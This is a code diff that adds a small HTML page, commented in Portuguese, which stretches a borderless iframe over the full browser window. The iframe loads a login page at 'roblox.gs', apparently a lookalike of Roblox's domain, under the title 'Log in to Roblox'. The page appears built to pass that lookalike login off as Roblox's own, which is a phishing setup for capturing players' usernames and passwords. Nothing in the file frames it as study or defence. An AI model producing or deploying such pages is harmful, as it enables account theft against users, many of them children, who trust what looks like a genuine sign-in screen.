@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iframe Full Screen</title>
+    <style>
+        /* Garantir que o body ocupe toda a altura da tela */
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;  /* O corpo e o html devem ter 100% da altura da tela */
+        }
+
+        /* Tornar o iframe responsivo e ocupar a tela inteira */
+        iframe {
+            width: 100%;    /* O iframe ocupará toda a largura da tela */
+            height: 100%;   /* O iframe ocupará toda a altura da tela */
+            border: none;   /* Remover a borda do iframe */
+            position: absolute; /* Para garantir que o iframe ocupe o espaço todo */
+            top: 0;   /* Posicionar o iframe no topo da página */
+            left: 0;  /* Posicionar o iframe à esquerda da tela */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Iframe que cobre toda a tela -->
+    <iframe src="https://roblox.gs/login?returnUrl=4949288728613753" title="Log in to Roblox"></iframe>
+
+</body>
+</html>
